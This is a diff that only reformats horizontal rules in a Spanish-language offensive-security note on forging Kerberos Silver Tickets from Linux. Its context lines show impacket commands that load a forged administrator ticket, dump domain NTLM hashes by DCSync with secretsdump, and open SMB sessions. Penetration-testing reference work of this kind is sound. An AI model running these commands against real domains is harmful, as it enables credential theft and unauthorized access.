@@ -17,7 +17,7 @@ linked:
 
 # Silver Ticket - Forging Linux
 
-***
+---
 
 ## impacket-ticketer — RC4
 
@@ -42,7 +42,7 @@ export KRB5CCNAME=administrator.ccache
 klist
 ```
 
-___
+---
 
 ## impacket-ticketer — AES256 (OPSEC)
 
@@ -64,7 +64,7 @@ impacket-ticketer \
 export KRB5CCNAME=administrator.ccache
 ```
 
-___
+---
 
 ## Flags avanzados
 
@@ -77,7 +77,7 @@ ___
 | `-ts` | flag | Timezone fix. |
 ^st-forge-linux-flags
 
-___
+---
 
 ## DCSync via Silver Ticket (LDAP)
 
@@ -101,7 +101,7 @@ export KRB5CCNAME=administrator.ccache
 impacket-secretsdump -k -no-pass corp.local/administrator@dc01.corp.local -just-dc-ntlm
 ```
 
-___
+---
 
 ## Verificar y usar
 
@@ -122,4 +122,4 @@ impacket-smbclient -k -no-pass corp.local/administrator@web01.corp.local
 # smb: \> ls
 ```
 
-***
+---
